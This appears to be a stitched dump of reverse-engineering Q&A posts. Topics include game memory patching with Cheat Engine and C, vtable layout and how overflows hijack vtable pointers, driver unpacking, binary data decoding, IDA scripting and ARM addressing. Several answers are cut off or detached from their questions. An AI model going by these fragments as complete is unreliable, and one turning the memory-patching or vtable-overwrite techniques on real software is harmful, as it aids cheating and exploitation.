<li><code>mov esi, offset dword_xxxx</code> (most probably) means that it's just assigning the address (<code>xxxx</code> part) to <code>esi</code>, so this is a static address.</li>
</ul></li>
</ul>

<hr>

<h2>The usage</h2>

<p><strong>Cheat Engine</strong></p>

<p>In Cheat Engine, it's easy as inputting the pointer and the offset:</p>

<p><img src=""https://i.stack.imgur.com/gFBPU.png"" alt=""Cheat Engine""></p>

<p>As you can see, <code>0x5CCB138</code> is the <code>dword_xxxx</code>, the value inside <code>dword_xxxx</code> is <code>0x09021A00</code>, and that + <code>0x142</code> (my offset) results in the start of the in-game name.</p>

<p><strong>C</strong></p>

<p>In case you want to do it programmatically, you can do it like this in C:</p>

<pre><code>PCHAR my_name = PCHAR (*PDWORD(0x5CCB138) + 0x142);
^save the addr|       | ^deref to get     | add the offset
              | ^cast |    0x09021A00     |

// -&gt; be careful, do not surpass the max length!
// -&gt; also remember that there's 'your name' length + 1 \x00 byte
//    at the end!
char new_name[] = ""newName"";
strncpy(my_name, new_name, sizeof(new_name)); // again: be careful with the length!
</code></pre>

<p>The proper way, however, would be reversing the entire struct like this:</p>

<pre><code>struct player_data {
    int ID;
    char name[15];
    int some_data;
    ...;
};
// make sure the order / size of each item is correct!
// a single error can fuck up the entire struct

// I'm going to assume you understand pointers
player_data* data = *(player_data**) 0x5CCB138;

// do your changes
// again, be careful with the length!
// also note that sizeof() will not work if you use char*
char new_name[] = ""new name!"";
strncpy(data-&gt;name, new_name, sizeof(new_name));

","<p>Go to the memory window in Ollydbg. Find the code section (usually .text) of the module you want to break on return to.

You can also change the memory access to read only and you'll get an exception when execution hits that memory segment.</p>

<p>You can also use a trace and set a conditional stop when EIP is within a certain range, to do this simply set the condition by going to Debug, Set Condition (<kbd>Ctrl</kbd>+<kbd>T</kbd>). Then start the trace with Debug, Trace Into (<kbd>Ctrl</kbd>+<kbd>F11</kbd>)or Debug, Trace Over (<kbd>Ctrl</kbd>+<kbd>F12</kbd>). This will enable you to see where you came from, even if the call is indirect.</p>

<p>It's not guaranteed to be on return but if you're in a different module it's fairly likely that the return is when the first execution happens. You could also be triggering on calls through imports, through object vtables or some other mechanism. You'd need to study the state you're in when the break hits.</p>

"How to find the location of the vtable?","2762","","<p>Actually, I am trying to learn a little about vtable overflows. So, my learning documents state the following: </p>

<blockquote>
  <p>The main point to realize is that whenever we declare a C++  class
  with virtual methods, the pool of memory where it exists (the heap,
  the stack, etc.) now contains a pointer to a function pointer table
  which will eventually be used to call the function. In the event of an
  overflow, we can overwrite this pointer value so that our code will be
  called the next time a virtual method is called.</p>
</blockquote>

<p>So, my question is, how do I find the location of the vtable pointer ? </p>

<p>I mean, do I have to search through PEB like when I am trying to find the base address from some modules. Or, is this specific for each situation ?</p>
","<p>This is compiler dependent - the compiler may place the vtable wherever it wants to, as long as it does it consistently. However, in most cases, the vtable pointer is the first element (at offset 0) of the generated structure.</p>

<pre><code>class test {
    int a;
    int b;
    test()          { ...; }
    ~test()         { ...; }
    void somefunc() { ...; }
    int c;
}
</code></pre>

<p>would use this memory layout for the class:</p>

<pre><code>+----------------+               +--------------+
|  vtable        | ------------&gt; | test         |
+----------------+               +--------------+
|  a             |               | ~test        |
+----------------+               +--------------+
|  b             |               | somefunc     |
+----------------+               +--------------+
|  c             |
+----------------+
</code></pre>

<p>so (assuming pointers and integers are all 4 bytes), the vtable is at offset 0, a at 4, b at 8 and c at 12.</p>

<p>Note that not all compilers use this convention. For example, the Watcom C++ 386 compiler didn't use a vtable at all, but mixed the function pointers with data. (I know this case because i once disassembled a game that was compiled with Watcom 20 years ago. Not that i expect you to ever see this kind of layout in a modern compiler, just to provide an example that it can be different):</p>

<pre><code>+----------------+
|  test          |
+----------------+
|  ~test         |
+----------------+
|  a             |
+----------------+
|  b             |
+----------------+
|  somefunc      |
+----------------+
|  c             |
+----------------+
</code></pre>

<p>The entries at offset 0 and 4 (again, assuming 4 byte integers/pointers) are the parameterless constructor and destructor function of the class, the rest is a mix of variables and methods in the order they appear in the class definition. Of course, this is horribly inefficient, because the compiler has to initialize every class method whenever an object is instantiated, instead of just setting one pointer to the vtable.</p>

<p>TL;DR: In most cases, the vtable pointer is the first element of the class structure, but you really need to know which compiler was used and which conventions this compiler has.</p>

<p>Another thing - you talk about a ""vtable overflow"" in your original post. Your ""normal"" exploit doesn't overflow a vtable; the vtables are pre-initialized when your program starts, and (normally) never ever change. To write an exploit, you would either:</p>

<ol>
<li>use a buffer overflow to modify a function pointer in a vtable, so the next time the class method gets called, your code is executed instead</li>
<li>use a buffer overflow to modify the vtable pointer of a class instance, so the next time this class instance executes a method, your vtable is used instead of the other one.</li>
</ol>

<p>As vtables normally don't change, and may even be placed in a read-only memory segment by the compiler, your normal exploit ignores 1. and uses 2.</p>

I break on system entry point, so I start in ntdll and hit ""trace into"" but the TLS callback which is from the main executable is not logged if I don't put a breakpoint on it.

"extracting data from binary file","2727","","<p>I have a binary file and a text file of the corresponding data, and I know the location in the binary file where the data are contained. However, I am unable to determine in what manner the data are encoded. The data do not appear to be stored as float16, float32, float64, signed/unsigned int of various length, or char, based on analysis of the hexdump. Perhaps the section containing the data has been compressed by some algorithm, or perhaps the numbers are stored in a representation with which I am unfamiliar.</p>

<p>The human-readable data are as follows:</p>

<pre><code>20.0,0.001
21.0,0.001
22.0,0.001
23.0,0.001
24.0,0.002
25.0,0.002
26.1,0.002
27.0,0.004
28.0,0.002
29.0,0.002
30.0,0.003
31.0,0.004
(etc)
</code></pre>

<p>I have 70 such lines, each containing two numbers of the precision shown in the table. The corresponding data section comprises 2312 hexadecimal digits, or 1156 bytes. There is a repeating pattern of characters ascending the ASCII table followed by @ signs (e.g., 4@ = '0x3440', 5@ = '0x3540', 6@ ='3640', etc.). This ""motif"" occurs every 16 bytes and there are 70 occurrences. One challenge is that although there is a monotonic progression in the ASCII value of the byte preceding the @ ('0x40'), it does not always increase (i.e., there are stationary points, sometimes followed by a jump that skips over one of the ASCII characters; for instance <code>4@ ... 5@ ... 6@ ...6@ ... 8@ ... 9@ ...</code>). Based on the 16-byte periodicity of this motif, I assume each row in the human-readable table is represented in the binary file by 16 consecutive bytes. Thus, the total size of the binary data table would be 16*70 = 1120 bytes. The complete data table is 1156 bytes, so I further assume the unexplained 36 bytes contain header information. Indeed, I can account for most of the header: 15 bytes containing a data descriptor in plain text, 16 bytes of zeros which appears to serve as an offset, and one byte ('0x46' = 70 in decimal) which appears to encode the number of lines in the table.</p>

<p>My problems are currently the following:</p>

<ul>
<li>I do not know the ""phase"" of the 16 bytes of data (i.e., where one 16 byte segment ends and the next begins)</li>
<li>I do not know how the human-readable numbers are encoded. They do not appear to be encoded in various float or integer representations, nor as ASCII characters.</li>
<li>I do not know whether the data are compressed and if so how to determine the method of compression. If they are compressed, then the compression would be restricted to the data table itself since I can find plain text elsewhere in the binary file by running <code>strings</code> on it. Running <code>file</code> on the binary file simply reports that it contains ""data"".</li>
</ul>

<p>An example of the hexadecimal contents (<code>xxd</code> dump) corresponding very nearly to the contents above and aligned to show the progression of '0x40' = @ that I mentioned previously is shown below. This table begins with the '0x46' (decimal 70), to which I alluded previously as being a part of the header and representing the number of lines in the data table. The hex digits before the colon simply give the offset of the line from the beginning of the file; the middle section shows eight bytes (16 hex digits) of data; the right part of the table shows the ASCII-printable values for the hex data (<code>.</code> signifies ASCII-unprintable values, mostly <code>0x00</code>).</p>

<p>I would like advice on how to proceed with this particular problem, mainly determining whether compression is a factor and how the numbers are represented in the binary file, since I can thus far detect no obvious correspondence between the rows of human-readable data and the repeating 16-byte motifs that I described.</p>
","<p>This data actually is in standard x86 double (8 byte) representation, with the first 4 byte something else (46 00 00 00 probably being 70 as you said) and the data starting at offset 0x184 in the binary file.</p>

<p>What probably confused you is the fact that the human-readable data is rounded, and the binary file has a better precision. So, for example, your <code>23.0</code> is actually <code>22.99</code>, which is why <code>3640</code> occurs twice, and the next value, <code>24.00</code>, has <code>38 40</code>.</p>

<p>When I convert your hex back to binary (edit out the offset and character dump, then <code>xxd -r -p &lt; x.hex &gt; x.bin</code>), then run the following perl program over it:</p>

<pre><code>open(F, ""&lt;$ARGV[0]"");
binmode F;

seek(F, 4, 0);

while (read(F, $dbl, 8)) {
    read(F, $dbl2, 8);
    printf(""%15.10f  %15.10f   "", unpack(""d"", $dbl), unpack(""d"", $dbl2));
    printf(""%4.1f  %5.3f\n"", unpack(""d"", $dbl), unpack(""d"", $dbl2));
}
</code></pre>

<p>I get this:</p>

<pre><code>20.0000000000     0.0014648438   20.0  0.001

<p>As you see, the right 2 columns are the numbers in your precision and match (except the last 0.004 which isn't in your file), while the first 2 columns are in high precision and, sometimes, have a value that is slightly less than the next integer.</p>

<p>I found this by converting 20.0 to double and checking the hex:</p>

<pre><code>perl -e ""print pack('d', 20.0);"" | xxd
0000000: 0000 0000 0000 3440                      ......4@

"How do I move from RCE being a hobby to RCE being a profession?","2698","","<p>I'm currently a high school sophomore. I haven't really done much on the RCE of malware, I've unpacked <code>zbot</code> and <code>rbot</code>, and looked at how they work, but I can manipulate practically any game to my liking by reverse engineering it and finding out which functions I need to detour, or what addresses of code I need to patch. </p>

<p>From what I've read on the <a href=""http://www.reddit.com/r/ReverseEngineering/"">/r/ReverseEngineering</a>, I should create a blog, but what do what do I write on the blog? Do I just detail how I hacked the game? Or must it be purely reversing of malware?</p>
","<p>Someone who does RCE as a hobby and has gathered a lot of experience and hones his/her skills with it can arguably be more experienced than someone doing it for a living but only occasionally.</p>

<p>Simply put: to make it a profession (i.e. what you do for a living), take up a job which requires (and subsequently fosters) your RCE expertise.</p>

<p>And no, by no means do you have to reverse engineer malware in order to be considered a reverse engineer. For all practical purposes in the scope of this site even people reverse engineering household electronics or other consumer goods are just that: reverse engineers. Malware is but one field of expertise within the niche subject of RCE.</p>

<p>And there are loads of fields within RCE. Heck, have a look on <a href=""https://reverseengineering.meta.stackexchange.com/"">meta.RE.SE</a> to see what some want to be within the scope of this site and others don't (and participate, please!). Given that by comparison the RCE community is a relatively small one, I don't think anyone will look down on you for being a beginner or specializing in this or that. Instead, I reckon, you'll be welcomed and the only expectation is the willingness, ability and - yes - <strong>eagerness</strong> to learn.</p>

<p>There is no clear line between the amateur and the professional, which I gather is what your question is all about. Except if you consider that someone makes a living from his reverse engineering skills as that line. But I think anyone with a high enough experience/skill level has to be considered a professional based on that experience/skill - not based on how s/he makes his/her living.</p>

<p><strong>And no, you don't <em>need</em> a blog.</strong> But don't let that keep you from creating one. A blog, especially if you are a student, can be a good reference for potential future employers. So if you choose a more serious nickname than I chose here on SE, if you keep the topics and language in your blog posts professional and refrain from leet-speak, you will not only gather followers within the RCE community, you'll also show what you are capable of. And that last part is what sets the professional seasoned reverse engineer apart from the amateur or beginner: <strong>experience, loads and loads of experience.</strong>

<h2>If you want to work in the anti-X industry</h2>

Here follow my remarks</p>

<h3>A career in AV</h3>

<ul>
<li>most AV companies will not hire anyone who <em>wrote</em> malware. Some, as far as I know, did in the past. However, this only fosters the urban myth that we're writing the malware ourselves. I can tell you that we really don't have to - the commercialized malware <em>industry</em>, yes <em>industry</em>, does a pretty good job at it and we try hard to keep up. However, there is truth in that urban myth in that one of the - if not <em>the</em> - first AV vendor (I want give names!) offered bounties for new malware. Well what's the easiest way of getting a bounty if the few available samples are all <em>known</em>? Uh huh, writing your own and submitting it to cash the bounty ...

<ul>
<li>some companies will ""tone it down"" to"" <em>we will not hire anyone who wrote malware and is stupid enough to admit it - if s/he wrote one and we find out, we'll fire that person on the spot.</em></li>
</ul></li>
<li>analyzing malware requires some specializations that you won't have in other RCE topics. If you specialize in kernel mode malware, you are fairly specialized but there will be demand for people with these skills. Still most of the generic methodologies in RCE are applicable for malware - after all reversing malware is a subset of RCE as a whole.</li>
<li>some analysts in AV labs won't have the expertise and skills to work with <a href=""/questions/tagged/disassembly"" class=""post-tag"" title=""show questions tagged &#39;disassembly&#39;"" rel=""tag"">disassembly</a>, for example. Some know a few basics, for some that all stopped back in DOS times (i.e. they will be able to use good ol' <code>debug</code> on a <code>.com</code> file and that's it) and others will specialize in malicious scripts and not need that skill set at all. Also many malware families these days can be identified by traits that don't require going into the nitty gritty.</li>

<p>How can you reliably unpack a Windows driver manually?</p>
","<p>I kind of like your answer about changing the subsystem, especially if you're not a fan of kernel debugging.  I'm a big fan of Windbg, though.  The way I do this is: </p>

<ol>
<li>Hook up my kernel debugger to a VM</li>
<li>Change the first byte of the driver's entry point to be an INT3 (0xCC).</li>
<li>Fix-up the PE checksum (I'm a fan of letting <a href=""https://code.google.com/p/pefile/"">pefile</a> do this work for me).</li>
<li>Load the driver in the VM ( <a href=""http://www.osronline.com/article.cfm?article=157"">OSR</a> has a great driver loader )</li>
</ol>

<p>The kernel should call <code>DriverEntry()</code> on your driver and break into your debugger for you.  Then you can trace the code until you find the OEP as you would have done anyway.  The main advantage I see to this method is that you don't have to fake kernel DLLs or calls that the driver might do during unpacking, and it works on x64.</p>

"How are x86 CPU instructions encoded?","2643","","<p>I'm writing a small utility library for hooking functions at run time. I need to find out the length of the first few instructions because I don't want to assume anything or require the developer to manually input the amount of bytes to relocate and overwrite.</p>

<p>There are many great resources to learn assembly but none of them seem to go into much detail on how assembly mnemonics get turned into raw binary instructions.</p>
","<p>If you want to understand the instruction encodings in detail you need to study <a href=""http://download.intel.com/products/processor/manual/325383.pdf"">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2 (Instruction Set Reference, A-Z)</a>. Be aware that Intel IA-32 and AMD64 are very complicated instruction sets and in order to hook a function which is not specifically designed to be hooked by injecting a jump you will run into a great number of different instructions. There is no guarantee that the function even has a stack frame set up. </p>

<p>There are libraries which can do the disassembly and hooking for you, such as <a href=""http://research.microsoft.com/en-us/projects/detours/"">Detours</a> by Microsoft Research.</p>

"OllyDbg 1.10 - attaching to running process suspends it indefinitely","2632","","<p>In my OllyDbg v1.10, when I attempt to attach the debugger to a running process, Olly behaves as if it was successful, but the process is frozen (I'm unable to bring the window back up). I've tried switching to the main module, hitting F9 - still nothing, the process simply halts (""Paused"" in Olly). I've found this issue described by a user on some forum, but it had remained unresolved as others had trouble reproducing it.</p>

<p>I've tried this for MS Notepad, Calc, regedit and a propetriary 3rd party application, and the result is the same everywhere.</p>

<p>This does not hold true for Olly 2.0 - that version behaves as expected, simply attaches to the process and lets me explore it.</p>

<p>My OS is a 32-bit Windows 7 Ultimate.</p>
","<p>Since this apparently isn't a very well-known issue, all I can say is that version 2.01 has no such problems. My solution was to just switch to it.</p>

"How to extract all the rodata data and bss section using IDC script in IDA Pro?","2631","","<p>test Platform is 
32 bit Linux ELF and 32 bit Windows PE.</p>

<p>I use IDC script to extract all the functions from binary and dump 
into a file, then do the analysis based on the examples in IDA Pro book.</p>

<p>But I don't know how to extract .data .rodata and .bss
sections from ELF file using IDC script.</p>

<p>Currently I use IDA Pro to create a asm file, and use Python script to 
do the string parser work, extracting .data .rodata and .bss
sections from this asm file.</p>

<p>Basically It works fine, but a really tedious modification work is required, 
and as my test base is relatively large(notepad++ and others..), I have to
spend lots of time do modify work to correctly extract this three sections.</p>

<p>My question is ""is there any idc script/idapython script can extract .data .rodata and .bss
sections from ELF file?"" and any solutions on Windows are also welcomed.</p>

<p>Thank you!</p>
","<p>For the <code>.bss</code> section something like the following may work for you:</p>

<pre><code>import idaapi
import idc

print ""section .bss""
start = idaapi.get_segm_by_name("".bss"").startEA
end = idaapi.get_segm_by_name("".bss"").endEA
item = idc.NextHead(start - 1, end)
while item != BADADDR:
   next = idc.NextHead(item, end)
   if next != BADADDR:
      print ""%s: resb %d"" % (idc.Name(item), next - item)
   else:
      print ""%s: resb %d"" % (idc.Name(item), end - item)
   item = next
</code></pre>

<p>although in practice, <code>NextHead</code> does not seem to pick up anything named as <code>unk_XXXX</code>, so you may need to further iterate over the section to determine whether there are any cross references to an address to decide whether to associate a declaration with it.</p>

<p>For the <code>.data</code> and <code>.rodata</code> sections you will need to change to <code>db/dw/dd/...</code> as appropriate and additionally dump the content of the related items. The challenge for items in these sections is to properly determine the size of each item and correctly choose <code>db/dw/dd/...</code> Dumping raw bytes with <code>db</code> may be the simplest approach here.</p>

"How to disassemble/run mips ELF file ? (with readelf error)","2626","","<p>So i want to disassemble and then run a MIPS elf file for the first time. As i don't have MIPS hardware i am using mipsel-unknown-linux-gnu toolchain.Here comes the problem. The output of the command file myelf is:</p>

<pre><code>ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked (uses shared libs), stripped
</code></pre>

<p>But when i try to disassemble the file i get:</p>

<pre><code>mipsel-unknown-linux-gnu-objdump: myelf: File format not recognized
</code></pre>

<p>I get the same error when i want to run it or to debug it. But if i write a small program in MIPS assembly (using an edit and mipsel-unknown-linux-gnu-as as assembler and mipsel-unknown-linux-gnu-ld as a linker) i can run it and debug it so i'm sure the problem comes from myelf file. Actually i can disassemble myelf with IDA but i want to follow the execution using gdb under linux.</p>

<p>Then i did a readelf and this is the output of mipsel-unknown-linux--u-readelf -a myelf:</p>

","<p>This file is completely valid ELF, but you have a problem with the toolchain.

"How do I change a string correctly in IDA Pro?","2616","","<p>I am trying to patch a cydia tweak which has been developed by using Objective-C. I would like to modify a piece of code to suite my need.</p>

<p>I'm using IDA Pro V6.8 for my examining. After inspecting, I recognize that each Hex byte would represent a part of an assembly line code.</p>

<p><em>Bellow is a screenshot for the code that I need to change.</em>
<a href=""https://i.stack.imgur.com/I0Yb2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/I0Yb2.png"" alt=""enter image description here""></a></p>

<p>Looking at the above screenshot, we need to have 8 bytes <em>(4A F2 A6 50 C0 F2 01 00)</em> to represent a ""MOV"" instruction. Let's me say something about these 8 bytes:</p>

<ol>
<li>As I know, the first four bytes <em>(4A F2 A6 50)</em> represent for ""#(cfstr_UnknownCallbac - 0x9F56)"" which you see in the screenshot.</li>
<li>The two following bytes <em>(C0 F2)</em> represent for an MOV instruction.</li>
<li>The last two bytes <em>(01 00)</em> would tell the system to move value from the string into the register, in this case, the register is R0.</li>
</ol>

<p><strong>I have some concerns about the MOV instruction and the first four HEX bytes (4A F2 A6 50)</strong></p>

<ol>
<li><p>What does the ""0x9F56"" in the instruction means?</p></li>
<li><p>How does the system know that the first four bytes reflect correctly to ""#(cfstr_UnknownCallbac - 0x9F56)"" not any other string variables?</p></li>
<li><p><em>I need to create a new string and then I will use it to replace the existing ""#(cfstr_UnknownCallbac - 0x9F56)""</em>. I believe that I just need to replace the first four HEX bytes so that it would point to the new string, but I don't know what are the HEX codes should I have here.</p></li>
</ol>

<p>Any help is appreciated, thank you very much.</p>
","<p>To understand what's happening, you need to learn about <a href=""https://en.wikipedia.org/wiki/Position-independent_code"" rel=""nofollow noreferrer"">Position Independent Code</a> (PIC). </p>

<p>In a nutshell, the compiler wants the executable code to be correct independent of where in memory it gets loaded. In the case of a shared library, the OS may load it at a different place every time; even if statically linked, PIC will make the linker's life easier.</p>

<p>The ""trick"" that's normally used on ARM processors to produce PIC is using PC (Program Counter) relative addresses. The compiler doesn't produce code that says ""the string is at address 0x123456"", it produces ""the string is 0x1234 bytes behind this instruction"". Thus, when the program is moved in memory, the ""0x1234"" stays the same.</p>

<p>Which is why your 2nd instruction adds the program counter to the relative address in R0.</p>

<p>Now, to know what <code>ADD R0, PC</code> really does, you need to know how the processor works. The processor is in Thumb (2 byte instructions) mode as you can see from the 2 bytes difference between <code>9F52</code> and <code>9F54</code>, and when the processor executes the <code>ADD R0, PC</code> instruction, the prefetch unit will already have read the first two bytes of <code>BLX _MSlog</code>. So the PC that gets added is actually <code>9F56</code>. This should answer your <strong>first question</strong>: in the display of the opcode's meaning, IDA subtracts the value it knows to be added in the next instruction.</p>

<p><strong>Second question</strong>: I don't know the internals of IDA, but I'm 99% sure it looks for <code>ADD Rx, PC</code> instructions, and produces a string reference like yours at the preceding instruction that loads <code>Rx</code>, just because it knows this is the standard way of achieving PIC on ARM.</p>

<p><strong>Third question</strong>: Manually disasembling Thumb is hard - really hard - as you can see if you check the <a href=""https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf"" rel=""nofollow noreferrer"">Thumb instruction set</a>. And no, <code>4a f2 a6 50</code> isn't just a data offset; it loads the lower 16 bits of the value, and <code>C0 F2 01 00</code> loads the higher 16 bits of the value. The <a href=""https://www.onlinedisassembler.com/odaweb/6xokUFH4/0"" rel=""nofollow noreferrer"">Online Disassembler</a> translates those two sets of 4 byte instructions to </p>

<pre><code>movw r0, #42406 ; 0xa5a6          
movt r0, #1
</code></pre>

<p>and you can read <a href=""https://stackoverflow.com/questions/7800055/movw-and-movt-in-arm-assembly"">here</a> about the <code>movw</code> and <code>movt</code> instructions. IDA is friendly enough to show all of this as one single 8-byte instruction, but under the hood, a lot more is going on.</p>

<p>So if you really want to change an offset like this, get familiar with the thumb manual I linked above, learn each and every bit, and assemble the new instructions manually. Or, just (ab)use the gnu assembler in the way I outlined in my answer to <a href=""https://reverseengineering.stackexchange.com/questions/9094/offset-calculation-for-branch-instruction-in-arm/9096#9096"">this question</a>. Just write a bare minimum assembler snippet and have <code>as</code> handle the gory details for you.</p>

<p>But, as @joxeankoret said: if you just want to change a string, and don't need the original string anwhere else, and the new string isn't longer than the old one, overwriting the string with the new one will be much easier than finding a place for your new string and adjusting the offsets. You can jump to that position by double clicking the label in IDA, or just scroll to the address <code>2FF4C</code> (<code>1A5A6+9F56</code>).</p>

<p><strong>TL;DWTR (too long, don't want to read):</strong> skip ahead to the section <em>Why it is a hard task to compare binary executable code?</em> if you feel comfortable with the basics around assembly and disassembly. Alternatively skip to the bottom of this answer (<em>TL;DR</em>).</p>

<h1>Gentle Intro - binary executable code, how does it look?</h1>

<p>Binary executable code is made for computers to read, this is why it is commonly referred to as <a href=""https://en.wikipedia.org/wiki/Machine_code"" rel=""nofollow noreferrer"">machine code</a>. This means it is binary ""data"" that is usually represented as <a href=""https://en.wikipedia.org/wiki/Hexadecimal"" rel=""nofollow noreferrer"">hexadecimal numbers</a> to the naked eye. A category of <a href=""/questions/tagged/tools"" class=""post-tag"" title=""show questions tagged &#39;tools&#39;"" rel=""tag"">tools</a> named ""hex editors"" exists for this task.</p>

<p>Here's how this commonly looks, using <a href=""http://hte.sourceforge.net/"" rel=""nofollow noreferrer"">HTE</a> for the screenshot:</p>

<p><img src=""https://i.stack.imgur.com/gKhUF.png"" alt=""HT Editor""></p>

<p>The reason this is so convenient is because each hex digit represents exactly one nibble, that is 4 bits. So two hex digits can be used to represent a single 8-bit byte (the most common type of byte). Then showing them in multiples of 16 bytes per line has the additional advantage of making it easier to read the hexadecimal offset (given as 8-digit hexadecimal number in front of the hex bytes in the screenshot above), because decimal <code>16</code> is <code>0x10</code>. The most common notations for hexadecimal numbers are:</p>

<ul>
<li>prefix <code>0x</code>: e.g. <code>0x10</code> (C and related languages)</li>
<li>prefix <code>$</code>: e.g. <code>$10</code> (Pascal, Delphi)</li>
<li>suffix <code>h</code>: e.g. <code>10h</code> (assembly language)</li>
</ul>

<p>Side-note: the line between code and data is a thin one and disassemblers sometimes struggle to identify the bytes in a binary file as one or the other, although heuristics can be applied to help in the process of identification.</p>

<h2>Assembly</h2>

<p>Aside from the ""raw"" form of hexadecimal numbers there is also the human-readable representation known as <a href=""https://en.wikipedia.org/wiki/Assembly_language"" rel=""nofollow noreferrer"">assembly language</a>. This is a <a href=""https://en.wikipedia.org/wiki/Mnemonic"" rel=""nofollow noreferrer"">mnemonic</a> form of the binary instructions (or opcodes) and usually represents them 1:1 with very minor abstractions. The notable exception to this are macro assemblers such as <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=12654"" rel=""nofollow noreferrer"">Microsoft's MASM</a> which provide a higher levels of abstraction as a convenience.</p>

<p>Side-note: the program that digests assembly language code (also ""assembly code"" or ""assembler code"") is called an <strong>assembler</strong>.</p>

<p>Depending on the type of processor and the exact architecture, various flavors of assembly language exist. For the scope of this question we'll stick with the <a href=""https://en.wikipedia.org/wiki/IA-32"" rel=""nofollow noreferrer"">IA-32 architecture</a> - also known as x86 (32bit, <a href=""/questions/tagged/x86"" class=""post-tag"" title=""show questions tagged &#39;x86&#39;"" rel=""tag"">x86</a>), because its origins lie with the 8088 and 8086 processors, with subsequent processor (CPU) models being numbered <code>80x86</code>, where <code>x</code> was a one-digit number. Starting with the 80586 Intel departed from that naming scheme as they introduced the Pentium.</p>

<p>Nevertheless, it is good to know that two main processor architectures exist: <a href=""https://en.wikipedia.org/wiki/Complex_instruction_set_computing"" rel=""nofollow noreferrer"">CISC</a> (68k, x86, x86-64) and <a href=""https://en.wikipedia.org/wiki/Reduced_instruction_set_computing"" rel=""nofollow noreferrer"">RISC</a> (SPARC, MIPS, PPC), whereas the aficionados of one or the other have claimed victory for their preferred architecture at one time or another, both still exist to this very day, although at the microcode level one could even argue CISC architectures to be RISC ""internally"". That said, x86 <em>is</em> a CISC architecture.</p>

<p>Just to give you glimpse of what RISC and CISC look like in comparison, let's look at a few basic x86 and <a href=""https://en.wikipedia.org/wiki/MIPS_architecture"" rel=""nofollow noreferrer"">MIPS instructions</a>:</p>

<pre><code> x86          |    MIPS              | Meaning
-----------------------------------------------
 mov          | lb, lw, sb, move     | copy/""move"" value from/to register/memory location
 jmp, jz, jnz | j/b, beq, beqz, bgez | jump unconditionally or on condition
 call         | jal                  | call other routine / jump and link
</code></pre>

<p>What hopefully becomes clear at first glance (line with <code>mov</code>) is the fact that in MIPS you heave a much larger number of very basic instructions than x86, which is the gist of the CISC versus RISC paradigm. Another thing is that we see how MIPS uses <code>j</code> and <code>b</code> as the mnemonic prefix for jump and branch (the difference being generally the distance these ""jumps"" can cover), whereas x86 uses also <code>j</code> as in <code>jmp</code> (unconditional jump), <code>jnz</code> (jump if not zero[-flag set]) but also has a dedicated <code>call</code> opcode which MIPS to my knowledge doesn't have - the closest approximation probably being <code>jal</code> (jump and link) which also stores the <a href=""https://en.wikipedia.org/wiki/Program_counter"" rel=""nofollow noreferrer"">program counter</a> in a register as opposed to x86's <code>call</code>, though, which stores it on the stack.</p>

<p>In CISC you can do a relatively complex operation with a single instruction, where in RISC you often need several instructions to express the same thing. In fact assemblers for RISC architectures tend to have so-called pseudo-instructions which combine oft-used combinations of instructions, but which get translated to individual RISC instructions during the translation phase.</p>

<p>An example would be the <code>ror</code> (bit-rotate right) instruction. On an x86 (CISC) this is an opcode in its own right with the <code>ror</code> mnemonic. On MIPS (RISC) this is a pseudo-instruction if and when the assembler offers it and it gets translated as follows (bit-rotate the value in register <code>$t2</code> by one bit and store result in <code>$t2</code> again):</p>

<pre><code>ror $t2, $t2, 1    --&gt;   sll $1 , $10, 31  (bit-shift $10 left by 31, store in $1)
                         srl $10, $10, 1   (bit-shift $10 right by 1, store in $10)
                         or  $10, $10, $1  (bit-wise or $1 and $10)
</code></pre>

<p>This example is taken from the book referenced a bit further down from here (<em>MIPS resources</em>), page 370.</p>

<p>However, we won't dig further into assembly language <em>basics</em> and instead focus on answering the question. I think it is not necessary to understand much more than the most fundamental facts to understand why simple and even complex diff tools fail at showing the differences of binary executable files.</p>

<h3>Compilers and assembly language</h3>

<p><a href=""https://en.wikipedia.org/wiki/Compiler"" rel=""nofollow noreferrer"">Compilers</a> (<a href=""/questions/tagged/compilers"" class=""post-tag"" title=""show questions tagged &#39;compilers&#39;"" rel=""tag"">compilers</a>) convert code constructs usually written by humans or machines into machine code [*]. The usual translation is to translate the human-readable source code into an intermediate form which gets then optimized and after optimization translated to assembly language which in turn gets translated to machine code. This is shown beautifully in the Wikipedia article above, with the diagram I am reproducing here below:</p>

<p><img src=""https://i.stack.imgur.com/aHGlr.png"" alt=""How a compiler works""></p>

<p>The gist is, that compilers usually have an assembler somewhere in their back end, even though you may never get to see the actual assembly language instructions yourself. If you wanted to get it, you would use:</p>

<ul>
<li>With GCC: <code>gcc -S ...</code> (AT&amp;T syntax) or <code>gcc -masm=intel -S ...</code> (Intel syntax)</li>
<li>With Microsoft Visual C++: <code>cl.exe /Fa ...</code></li>
</ul>

<p>[*] this is not the entire truth, as there are compilers which will create an intermediate <a href=""https://en.wikipedia.org/wiki/Byte_code"" rel=""nofollow noreferrer"">byte code</a> which then later gets translated further into machine code native to the CPU it is running on or interpreted on-the-fly. But for the scope of this answer we'll consider compilers to be the entities that convert human-readable high-level language source code into machine code through a number of processing stages, one of which involves assembly code.</p>

<p>NB: some compilers, such as Embarcadero Delphi will hide the different stages from you and present the process from compiling to linking as one opaque step. This can cause some confusion in Delphians attempting to learn C/C++ which <em>expose</em> the different steps.</p>

<h3>Intel versus AT&amp;T syntax</h3>

<p>For x86 there exist two competing syntax variants. The AT&amp;T syntax is favored in the *nix world and by <a href=""https://en.wikipedia.org/wiki/GNU_Assembler"" rel=""nofollow noreferrer"">GASM</a>, Intel in the Windows world and most disassemblers and assemblers. Consider this simple C program:</p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
    printf(""Hello world!\n"");
    return 0;
}
</code></pre>

<p>... and the translations with the AT&amp;T (<code>gcc -S hello.c</code> or explicitly <code>gcc -masm=att -S hello.c</code>) and Intel (<code>gcc -masm=intel -S hello.c</code>) syntax respectively:</p>

<pre><code> AT&amp;T                        |  Intel
------------------------------------------------------------------------
.LC0:                        | .LC0:
    .string ""Hello world!""   |     .string ""Hello world!""
    .text                    |     .text
.globl main                  | .globl main
    .type   main, @function  |     .type   main, @function
main:                        | main:
    pushl   %ebp             |     push    ebp
    movl    %esp, %ebp       |     mov ebp, esp
    andl    $-16, %esp       |     and esp, -16
    subl    $16, %esp        |     sub esp, 16
    movl    $.LC0, (%esp)    |     mov DWORD PTR [esp], OFFSET FLAT:.LC0
    call    puts             |     call    puts
    movl    $0, %eax         |     mov eax, 0
